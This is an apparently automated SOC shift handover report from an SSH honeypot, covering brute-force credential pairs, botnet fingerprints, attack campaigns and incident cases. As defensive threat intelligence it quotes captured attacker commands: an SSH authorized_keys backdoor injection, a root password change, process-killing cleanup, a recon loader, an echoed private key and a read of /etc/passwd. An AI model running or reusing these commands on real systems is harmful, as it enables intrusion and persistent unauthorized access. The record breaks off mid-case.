# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-09 |
| **Generated At** | 2026-09-09T19:10:46Z |
| **Shift Time** | 19:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **336** |
| Confirmed Threats | **285** |
| False Positives Filtered | **51** (15.2%) |
| Unique Attacker IPs | **98** |
| Countries of Origin | **29** |
| High Severity Cases | **181** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **155** |
| Malware Samples Analyzed | **4** HIGH · **21** MED · 18 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **205** |
| Unique Credential Pairs | **140** |
| Unique Usernames | **51** |
| Unique Passwords | **110** |
| Successful Auth Pairs | **173** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 83 |
| `support` | 15 |
| `345gs5662d34` | 13 |
| `admin` | 10 |
| `uucp` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 15 |
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `admin` | 12 |
| `123456` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 15 |
| `345gs5662d34` | `345gs5662d34` | 13 |
| `admin` | `admin` | 10 |
| `root` | `LeitboGi0ro` | 6 |
| `uucp` | `uucp` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `11111111` | `81.169.219.15` | 2026-09-09T12:56:55 |
| `root` | `111111111` | `81.169.219.15` | 2026-09-09T13:03:04 |
| `support` | `support` | `77.90.185.17` | 2026-09-09T13:08:37 |
| `root` | `1234q` | `81.169.219.15` | 2026-09-09T13:09:14 |
| `support` | `support` | `10.0.0.73` | 2026-09-09T13:11:25 |
| `root` | `12` | `81.169.219.15` | 2026-09-09T13:15:27 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-09T13:17:36 |
| `root` | `123` | `81.169.219.15` | 2026-09-09T13:21:37 |
| `root` | `1234` | `81.169.219.15` | 2026-09-09T13:27:46 |
| `root` | `!@#$12345pass` | `81.169.219.15` | 2026-09-09T13:33:55 |
| `admin` | `admin` | `156.227.234.198` | 2026-09-09T13:34:53 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-09T13:39:48 |
| `root` | `!@#$123` | `81.169.219.15` | 2026-09-09T13:40:04 |
| `root` | `!@#$12` | `81.169.219.15` | 2026-09-09T13:46:12 |
| `root` | `!@#$1` | `81.169.219.15` | 2026-09-09T13:52:20 |
| `admin` | `admin` | `144.225.6.184` | 2026-09-09T13:55:32 |
| `root` | `!@#$12345` | `81.169.219.15` | 2026-09-09T13:58:26 |
| `root` | `!@#$123456` | `81.169.219.15` | 2026-09-09T14:04:37 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-09-09T14:05:04 |
| `uucp` | `uucp` | `77.90.185.17` | 2026-09-09T14:06:50 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `184.105.247.195` | 2026-09-09T14:10:26 |
| `root` | `admin123` | `81.169.219.15` | 2026-09-09T14:10:46 |
| `root` | `admin1` | `81.169.219.15` | 2026-09-09T14:16:55 |
| `username` | `password` | `138.226.239.234` | 2026-09-09T14:19:00 |
| `root` | `admin12` | `81.169.219.15` | 2026-09-09T14:23:03 |
| `root` | `admin1234` | `81.169.219.15` | 2026-09-09T14:29:12 |
| `root` | `admin12345` | `81.169.219.15` | 2026-09-09T14:35:23 |
| `root` | `admin` | `10.0.0.73` | 2026-09-09T14:41:20 |
| `root` | `admin123456` | `81.169.219.15` | 2026-09-09T14:41:33 |
| `root` | `Abcd@1234` | `64.227.36.5` | 2026-09-09T14:46:11 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-09T14:47:09 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-09T14:47:09 |
| `root` | `admin1234567` | `81.169.219.15` | 2026-09-09T14:47:44 |
| `root` | `admin` | `77.90.185.17` | 2026-09-09T14:48:05 |
| `marielars` | `marielars` | `64.227.36.5` | 2026-09-09T14:48:50 |
| `root` | `klondike` | `64.227.36.5` | 2026-09-09T14:51:33 |
| `root` | `admin12345678` | `81.169.219.15` | 2026-09-09T14:53:53 |
| `root` | `[jaja]` | `64.227.36.5` | 2026-09-09T14:54:16 |
| `root` | `88` | `64.227.36.5` | 2026-09-09T14:56:58 |
| `root` | `letacla` | `64.227.36.5` | 2026-09-09T14:59:33 |
| `root` | `admin123456789` | `81.169.219.15` | 2026-09-09T15:00:02 |
| `root` | `Aa12345619` | `64.227.36.5` | 2026-09-09T15:02:13 |
| `root` | `Cthly@2025` | `64.227.36.5` | 2026-09-09T15:05:06 |
| `root` | `admin1234567890` | `81.169.219.15` | 2026-09-09T15:06:15 |
| `teamspeak` | `1234567890` | `64.227.36.5` | 2026-09-09T15:08:05 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `152.32.189.202` | 2026-09-09T15:08:33 |
| `root` | `root123456!` | `152.32.163.183` | 2026-09-09T15:10:55 |
| `345gs5662d34` | `345gs5662d34` | `152.32.163.183` | 2026-09-09T15:10:59 |
| `root` | `3245gs5662d34` | `152.32.163.183` | 2026-09-09T15:11:01 |
| `root` | `Abc123456` | `64.227.36.5` | 2026-09-09T15:11:04 |
| `root` | `admin0` | `81.169.219.15` | 2026-09-09T15:12:24 |
| `root` | `Qw147258` | `64.227.36.5` | 2026-09-09T15:14:04 |
| `root` | `macoco` | `64.227.36.5` | 2026-09-09T15:16:58 |
| `root` | `vfr4VFR$` | `64.227.36.5` | 2026-09-09T15:19:49 |
| `admin` | `admin` | `47.80.68.74` | 2026-09-09T15:23:29 |
| `root` | `﻿------fuck------` | `123.139.242.2` | 2026-09-09T15:32:31 |
| `root` | `﻿------fuck------` | `104.131.37.35` | 2026-09-09T15:34:19 |
| `root` | `LeitboGi0ro` | `141.148.157.218` | 2026-09-09T15:36:33 |
| `root` | `123@@@` | `141.148.157.218` | 2026-09-09T15:36:34 |
| `lima` | `lima123` | `103.63.108.25` | 2026-09-09T15:50:15 |
| `345gs5662d34` | `345gs5662d34` | `103.63.108.25` | 2026-09-09T15:50:19 |
| `lima` | `3245gs5662d34` | `103.63.108.25` | 2026-09-09T15:50:21 |
| `csgo` | `csgo` | `101.126.64.76` | 2026-09-09T16:04:22 |
| `345gs5662d34` | `345gs5662d34` | `101.126.64.76` | 2026-09-09T16:04:29 |
| `csgo` | `3245gs5662d34` | `101.126.64.76` | 2026-09-09T16:04:33 |
| `plex` | `plex` | `10.0.0.73` | 2026-09-09T16:12:03 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-09T16:12:05 |
| `plex` | `3245gs5662d34` | `10.0.0.73` | 2026-09-09T16:12:06 |
| `ubuntu` | `7` | `217.60.255.130` | 2026-09-09T16:24:20 |
| `root` | `123` | `2.57.122.209` | 2026-09-09T16:45:31 |
| `root` | `qaz123!@#` | `101.42.41.164` | 2026-09-09T16:45:33 |
| `root` | `Xx123456.` | `101.42.41.164` | 2026-09-09T16:47:21 |
| `345gs5662d34` | `345gs5662d34` | `101.42.41.164` | 2026-09-09T16:47:26 |
| `root` | `3245gs5662d34` | `101.42.41.164` | 2026-09-09T16:47:30 |
| `gra` | `gra` | `101.42.41.164` | 2026-09-09T16:48:06 |
| `gra` | `3245gs5662d34` | `101.42.41.164` | 2026-09-09T16:48:21 |
| `support` | `support` | `176.53.159.196` | 2026-09-09T16:48:36 |
| `root` | `1234` | `2.57.122.209` | 2026-09-09T16:48:59 |
| `milad` | `123456` | `101.42.41.164` | 2026-09-09T16:50:48 |
| `omkar` | `omkar` | `101.42.41.164` | 2026-09-09T16:51:25 |
| `omkar` | `3245gs5662d34` | `101.42.41.164` | 2026-09-09T16:51:33 |
| `postgres` | `12345` | `101.42.41.164` | 2026-09-09T16:51:59 |
| `postgres` | `3245gs5662d34` | `101.42.41.164` | 2026-09-09T16:52:13 |
| `root` | `12345` | `2.57.122.209` | 2026-09-09T16:52:28 |
| `test` | `2024` | `101.42.41.164` | 2026-09-09T16:52:34 |
| `test` | `3245gs5662d34` | `101.42.41.164` | 2026-09-09T16:52:43 |
| `shiva` | `123` | `101.42.41.164` | 2026-09-09T16:53:11 |
| `sol` | `sol` | `2.57.122.238` | 2026-09-09T16:53:35 |
| `ubuntu` | `ubuntu123456` | `101.42.41.164` | 2026-09-09T16:53:46 |
| `solana` | `solana` | `2.57.122.238` | 2026-09-09T16:55:19 |
| `root` | `wh123456@` | `10.0.0.73` | 2026-09-09T16:56:28 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-09-09T16:57:03 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-09-09T16:58:39 |
| `root` | `1234567` | `2.57.122.209` | 2026-09-09T16:58:44 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-09-09T17:00:10 |
| `root` | `12345678` | `2.57.122.209` | 2026-09-09T17:01:40 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-09-09T17:01:46 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-09-09T17:03:21 |
| `root` | `123456789` | `2.57.122.209` | 2026-09-09T17:04:47 |
| `node` | `node` | `2.57.122.238` | 2026-09-09T17:04:54 |
| `node` | `1234` | `2.57.122.238` | 2026-09-09T17:06:26 |
| `zomboid` | `zomboid` | `154.221.25.99` | 2026-09-09T17:06:52 |
| `345gs5662d34` | `345gs5662d34` | `154.221.25.99` | 2026-09-09T17:06:56 |
| `zomboid` | `3245gs5662d34` | `154.221.25.99` | 2026-09-09T17:06:57 |
| `root` | `1234567890` | `2.57.122.209` | 2026-09-09T17:07:15 |
| `node` | `123456` | `2.57.122.238` | 2026-09-09T17:08:07 |
| `git` | `123456` | `77.90.185.20` | 2026-09-09T17:09:20 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-09-09T17:09:51 |
| `root` | `Qwertyuiop1234` | `14.103.118.61` | 2026-09-09T17:09:57 |
| `root` | `123abc` | `2.57.122.209` | 2026-09-09T17:10:01 |
| `eth` | `eth` | `2.57.122.238` | 2026-09-09T17:11:30 |
| `root` | `1q2w3e4r` | `2.57.122.209` | 2026-09-09T17:13:00 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-09-09T17:13:06 |
| `testftp` | `test` | `172.191.239.155` | 2026-09-09T17:14:10 |
| `345gs5662d34` | `345gs5662d34` | `172.191.239.155` | 2026-09-09T17:14:11 |
| `testftp` | `3245gs5662d34` | `172.191.239.155` | 2026-09-09T17:14:11 |
| `tron` | `tron` | `2.57.122.238` | 2026-09-09T17:14:44 |
| `ubuntu` | `11` | `217.60.255.130` | 2026-09-09T17:15:33 |
| `root` | `P@ssw0rd123` | `2.57.122.209` | 2026-09-09T17:15:52 |
| `trx` | `trx` | `2.57.122.238` | 2026-09-09T17:16:21 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-09-09T17:17:53 |
| `root` | `abc123` | `2.57.122.209` | 2026-09-09T17:18:49 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-09-09T17:19:27 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-09-09T17:21:06 |
| `root` | `admin123` | `2.57.122.209` | 2026-09-09T17:21:40 |
| `solv` | `solv` | `2.57.122.238` | 2026-09-09T17:22:47 |
| `root` | `letmein` | `2.57.122.209` | 2026-09-09T17:24:18 |
| `solv` | `1234` | `2.57.122.238` | 2026-09-09T17:24:24 |
| `solv` | `123456` | `2.57.122.238` | 2026-09-09T17:26:02 |
| `root` | `pass123` | `2.57.122.209` | 2026-09-09T17:27:10 |
| `solv` | `12345678` | `2.57.122.238` | 2026-09-09T17:27:41 |
| `root` | `password` | `2.57.122.209` | 2026-09-09T17:30:00 |
| `support` | `support` | `182.181.236.240` | 2026-09-09T17:32:18 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-09-09T17:32:22 |
| `root` | `password1` | `2.57.122.209` | 2026-09-09T17:32:30 |
| `validator` | `validator` | `2.57.122.238` | 2026-09-09T17:34:01 |
| `root` | `qwerty123` | `2.57.122.209` | 2026-09-09T17:35:04 |
| `sol` | `sol123` | `2.57.122.238` | 2026-09-09T17:35:38 |
| `sol` | `123` | `2.57.122.238` | 2026-09-09T17:37:15 |
| `root` | `root123` | `2.57.122.209` | 2026-09-09T17:37:44 |
| `sol` | `12345678` | `2.57.122.238` | 2026-09-09T17:38:55 |
| `root` | `welcome` | `2.57.122.209` | 2026-09-09T17:40:19 |
| `trading` | `trading` | `2.57.122.238` | 2026-09-09T17:40:38 |
| `trader` | `trader` | `2.57.122.238` | 2026-09-09T17:42:16 |
| `support` | `support` | `138.226.239.234` | 2026-09-09T17:43:01 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-09-09T17:43:49 |
| `bot` | `bot` | `2.57.122.238` | 2026-09-09T17:45:25 |
| `bot` | `123456` | `2.57.122.238` | 2026-09-09T17:47:05 |
| `bot` | `12345` | `2.57.122.238` | 2026-09-09T17:48:42 |
| `user` | `1234` | `138.226.239.233` | 2026-09-09T18:05:30 |
| `root` | `﻿------fuck------` | `43.100.100.9` | 2026-09-09T18:08:52 |
| `root` | `123456z` | `10.0.0.73` | 2026-09-09T18:12:01 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-09T18:12:19 |
| `root` | `Aa123456@` | `10.0.0.73` | 2026-09-09T18:13:10 |
| `root` | `Aa123456@` | `138.226.239.234` | 2026-09-09T18:14:33 |
| `vnc` | `vnc1` | `109.160.32.112` | 2026-09-09T18:19:52 |
| `root` | `pass@123456` | `109.160.32.112` | 2026-09-09T18:19:54 |
| `altibase` | `altibase12` | `109.160.32.112` | 2026-09-09T18:20:16 |
| `altibase` | `altibase1` | `109.160.32.112` | 2026-09-09T18:20:28 |
| `root` | `password.1` | `109.160.32.112` | 2026-09-09T18:20:43 |
| `ychen` | `ychen123qwe` | `109.160.32.112` | 2026-09-09T18:21:03 |
| `root` | `Aa123456@` | `138.226.239.233` | 2026-09-09T18:21:15 |
| `geoserver` | `12345` | `109.160.32.112` | 2026-09-09T18:21:22 |
| `ftpuser` | `ftppass` | `10.0.0.73` | 2026-09-09T18:28:52 |
| `ftpuser` | `ftppass` | `138.226.239.234` | 2026-09-09T18:30:15 |
| `ftpuser` | `ftppass` | `80.94.95.115` | 2026-09-09T18:38:09 |
| `vpn` | `vpn` | `10.0.0.73` | 2026-09-09T18:46:43 |
| `admin` | `admin` | `23.88.108.246` | 2026-09-09T18:47:52 |
| `vpn` | `vpn` | `80.94.95.115` | 2026-09-09T18:49:25 |
| `vpn` | `vpn` | `138.226.239.233` | 2026-09-09T18:52:24 |
| `marc` | `123` | `107.211.37.253` | 2026-09-09T18:54:12 |
| `345gs5662d34` | `345gs5662d34` | `107.211.37.253` | 2026-09-09T18:54:14 |
| `marc` | `3245gs5662d34` | `107.211.37.253` | 2026-09-09T18:54:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **336** |
| Sessions with Fingerprint | **23** |
| Unique HASSH Fingerprints | **23** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 116 |
| libssh | 61 |
| OpenSSH | 21 |
| Paramiko (Python) | 12 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 52 | 4 |
| `f555226df196...` | Mirai/variant | 44 | 7 |
| `98f63c4d9c87...` | Generic scanner | 26 | 4 |
| `2ec37a7cc8da...` | Mirai/variant | 21 | 1 |
| `0a07365cc01f...` | Generic scanner | 10 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 52 | 4 | Generic scanner |
| `f555226df196...` | libssh | 44 | 7 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 26 | 4 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 21 | 1 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 10 | 1 | Generic scanner |
| `390ffe68a68c...` | OpenSSH | 9 | 2 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 7 | 5 | — |
| `1f2f2f9b0a73...` | libssh | 7 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **12** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 15 | 8 | `T1021.004, T1078, T1070, T1140` |
| **Recon Loader Script** | 🟡 MEDIUM | 19 | 1 | `T1082, T1592, T1078, T1083` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:g5XeK0fl9DaG"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.42.41.164`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.118.61`, `103.63.108.25`, `101.42.41.164`, `154.221.25.99`, `101.126.64.76`, `152.32.163.183`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch
```
Source IPs: `2.57.122.209`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **98** |
| Unique ASNs | **54** |
| High-Risk ASNs | **39** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 27 | HIGH |
| `AS398324` | Censys, Inc. | 6 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS7303` | Telecom Argentina S.A. | 3 | HIGH |
| `AS12389` | PJSC Rostelecom | 3 | LOW |
| `AS396982` | Google LLC | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (157)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2e6a0873759d

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-09 13:08 |
| **Last Seen** | 2026-09-09 13:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 13:08:36` | `cowrie.session.connect` |
| `2026-09-09 13:08:36` | `cowrie.client.version` |
| `2026-09-09 13:08:36` | `cowrie.client.kex` |
| `2026-09-09 13:08:37` | `cowrie.login.success` |
| `2026-09-09 13:08:39` | `cowrie.direct-tcpip.request` |
| `2026-09-09 13:08:39` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 13:08:39` | `cowrie.direct-tcpip.data` |
| `2026-09-09 13:08:39` | `cowrie.direct-tcpip.request` |
| `2026-09-09 13:08:39` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 13:08:39` | `cowrie.direct-tcpip.data` |
| `2026-09-09 13:08:39` | `cowrie.direct-tcpip.request` |
| `2026-09-09 13:08:39` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 13:08:39` | `cowrie.direct-tcpip.data` |
| `2026-09-09 13:08:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83aa335e8f12

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-09 13:14 |
| **Last Seen** | 2026-09-09 13:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 13:14:36` | `cowrie.session.connect` |
| `2026-09-09 13:14:36` | `cowrie.client.version` |
| `2026-09-09 13:14:36` | `cowrie.client.kex` |
| `2026-09-09 13:14:36` | `cowrie.login.success` |
| `2026-09-09 13:14:38` | `cowrie.direct-tcpip.request` |
| `2026-09-09 13:14:39` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 13:14:39` | `cowrie.direct-tcpip.data` |
| `2026-09-09 13:14:40` | `cowrie.direct-tcpip.request` |
| `2026-09-09 13:14:40` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 13:14:40` | `cowrie.direct-tcpip.data` |
| `2026-09-09 13:14:41` | `cowrie.direct-tcpip.request` |
| `2026-09-09 13:14:42` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 13:14:42` | `cowrie.direct-tcpip.data` |
| `2026-09-09 13:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-534062734963

| Field | Detail |
|---|---|
| **Source IP** | `156.227.234[.]198` |
| **First Seen** | 2026-09-09 13:34 |
| **Last Seen** | 2026-09-09 13:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 13:34:47` | `cowrie.session.connect` |
| `2026-09-09 13:34:47` | `cowrie.client.version` |
| `2026-09-09 13:34:47` | `cowrie.client.kex` |
| `2026-09-09 13:34:53` | `cowrie.login.success` |
| `2026-09-09 13:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.227.234[.]198` to AbuseIPDB if not already reported
- [ ] Block `156.227.234[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-016bf91c8a61

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-09 13:39 |
| **Last Seen** | 2026-09-09 13:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 13:39:48` | `cowrie.session.connect` |
| `2026-09-09 13:39:48` | `cowrie.client.version` |
| `2026-09-09 13:39:48` | `cowrie.client.kex` |
| `2026-09-09 13:39:48` | `cowrie.login.success` |
| `2026-09-09 13:39:50` | `cowrie.session.params` |
| `2026-09-09 13:39:50` | `cowrie.command.input` |
| `2026-09-09 13:39:50` | `cowrie.session.file_download` |
| `2026-09-09 13:39:50` | `cowrie.session.file_download` |
| `2026-09-09 13:39:50` | `cowrie.log.closed` |
| `2026-09-09 13:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f95487007bc

| Field | Detail |
|---|---|
| **Source IP** | `144.225.6[.]184` |
| **First Seen** | 2026-09-09 13:55 |
| **Last Seen** | 2026-09-09 13:56 |
| **Session Duration** | 62s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 13:55:31` | `cowrie.session.connect` |
| `2026-09-09 13:55:32` | `cowrie.telnet.option` |
| `2026-09-09 13:55:32` | `cowrie.telnet.option` |
| `2026-09-09 13:55:32` | `cowrie.login.success` |
| `2026-09-09 13:55:33` | `cowrie.session.params` |
| `2026-09-09 13:55:33` | `cowrie.telnet.option` |
| `2026-09-09 13:55:33` | `cowrie.telnet.option` |
| `2026-09-09 13:55:33` | `cowrie.command.input` |
| `2026-09-09 13:55:33` | `cowrie.command.input` |
| `2026-09-09 13:55:33` | `cowrie.command.input` |
| `2026-09-09 13:55:33` | `cowrie.command.input` |
| `2026-09-09 13:55:33` | `cowrie.command.failed` |
| `2026-09-09 13:55:33` | `cowrie.command.input` |
| `2026-09-09 13:55:33` | `cowrie.command.failed` |
| `2026-09-09 13:55:33` | `cowrie.command.input` |
